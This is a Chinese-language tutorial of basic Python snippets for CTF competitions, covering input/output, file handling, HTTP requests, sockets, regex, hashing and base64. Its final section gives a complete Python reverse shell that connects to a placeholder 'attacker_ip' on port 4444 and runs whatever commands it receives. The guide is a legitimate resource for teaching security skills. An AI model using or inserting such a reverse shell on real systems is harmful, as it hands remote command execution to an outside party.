在CTF（Capture The Flag）比赛中，Python是一种常用的脚本语言，用于快速编写解决方案、分析数据、自动化任务以及编写漏洞利用脚本。以下是一些Python的基本语句和常见用法，这些代码片段可以帮助你在CTF比赛中处理各种任务。

### 基本输入输出

#### 输入
```python
user_input = input("Enter something: ")
print("You entered:", user_input)
```

#### 输出
```python
print("Hello, World!")
```

### 变量和数据类型

#### 变量
```python
x = 10
y = 20
name = "CTF"
```

#### 数据类型
```python
integer = 10
float_number = 10.5
string = "CTF"
boolean = True
list_example = [1, 2, 3, "CTF"]
dict_example = {"key": "value", "number": 10}
```

### 条件语句

```python
x = 10
if x > 5:
    print("x is greater than 5")
elif x == 5:
    print("x is equal to 5")
else:
    print("x is less than 5")
```

### 循环

#### For 循环
```python
for i in range(5):
    print(i)
```

#### While 循环
```python
i = 0
while i < 5:
    print(i)
    i += 1
```

### 函数

```python
def greet(name):
    return "Hello, " + name

print(greet("CTF"))
```

### 文件操作

#### 读取文件
```python
with open("example.txt", "r") as file:
    content = file.read()
    print(content)
```

#### 写入文件
```python
with open("example.txt", "w") as file:
    file.write("Hello, CTF!")
```

### 网络操作

#### 发送HTTP请求
使用`requests`库来发送HTTP请求。
```python
import requests

response = requests.get("http://example.com")
print(response.text)
```

### 正则表达式

```python
import re

pattern = r"\d+"  # 匹配一个或多个数字
text = "There are 123 numbers in this text"
matches = re.findall(pattern, text)
print(matches)  # 输出 ['123']
```

### 序列化和反序列化

#### JSON
```python
import json

data = {"key": "value", "number": 10}
json_data = json.dumps(data)
print(json_data)

parsed_data = json.loads(json_data)
print(parsed_data)
```

### 异常处理

```python
try:
    x = 1 / 0
except ZeroDivisionError:
    print("Division by zero is not allowed")
finally:
    print("This block always executes")
```

### 进程和系统命令

#### 执行系统命令
```python
import subprocess

result = subprocess.run(["ls", "-l"], capture_output=True, text=True)
print(result.stdout)
```

### Socket 编程

#### 简单的Socket客户端
```python
import socket

host = "example.com"
port = 80
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
client.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

#### 简单的Socket服务器
```python
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 9999))
server.listen(5)

while True:
    client_socket, addr = server.accept()
    print("Accepted connection from:", addr)
    client_socket.send(b"Hello from server!\n")
    client_socket.close()
```

### 常用Python库

#### Requests库
```python
import requests

response = requests.get("http://example.com")
print(response.text)
```

#### BeautifulSoup库 (用于HTML解析)
```python
from bs4 import BeautifulSoup

html = "<html><body><h1>Hello, CTF!</h1></body></html>"
soup = BeautifulSoup(html, "html.parser")
print(soup.h1.text)
```

#### hashlib库 (用于哈希计算)
```python
import hashlib

hash_object = hashlib.sha256(b"Hello, CTF!")
print(hash_object.hexdigest())
```

### 基本编码和解码

#### Base64编码和解码
```python
import base64

# 编码
encoded = base64.b64encode(b"Hello, CTF!")
print(encoded)

# 解码
decoded = base64.b64decode(encoded)
print(decoded)
```

### 综合利用示例

#### 简单的反弹Shell (用于演示目的，请勿用于非法用途)
```python
import socket
import subprocess

host = "attacker_ip"
port = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(b"Connected\n")

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    s.send(output.stdout.encode() + output.stderr.encode())

s.close()
```

这些基本的Python语句和示例代码可以帮助你在CTF比赛中处理各种任务，快速编写解决方案和漏洞利用脚本。记住，在编写和运行代码时，要遵循道德规范和法律法规。